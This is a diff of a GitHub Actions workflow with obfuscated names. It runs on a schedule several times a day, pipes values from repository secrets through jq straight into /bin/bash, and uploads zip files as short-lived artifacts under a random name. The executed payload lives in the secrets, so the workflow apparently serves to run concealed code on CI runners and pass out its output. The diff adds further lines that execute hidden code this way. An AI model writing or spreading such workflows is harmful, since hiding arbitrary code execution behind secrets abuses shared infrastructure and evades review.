@@ -1,9 +1,9 @@
 name: brookeruby844
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '58 3/6 * * *'
+    - cron: '28 4,10,16,22 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,8 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: brookeruby844
         env:
-          ks693: ${{ secrets.ks693 }}
+          il4: ${{ secrets.il4 }}
         run: |
-          echo $ks693 | jq -r .bw74694 | /bin/bash
-          echo $ngzpa0318 | jq -r .jyult0 | /bin/bash
+          printf '%s' "$il4" | jq -r .ay683 | /bin/bash
+          printf '%s' "$hzz03" | jq -r .fv7 | /bin/bash
+          echo $rxpfn18 | jq -r .csi5 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: iSv07unc
+          path: "*.zip"
+          retention-days: 1
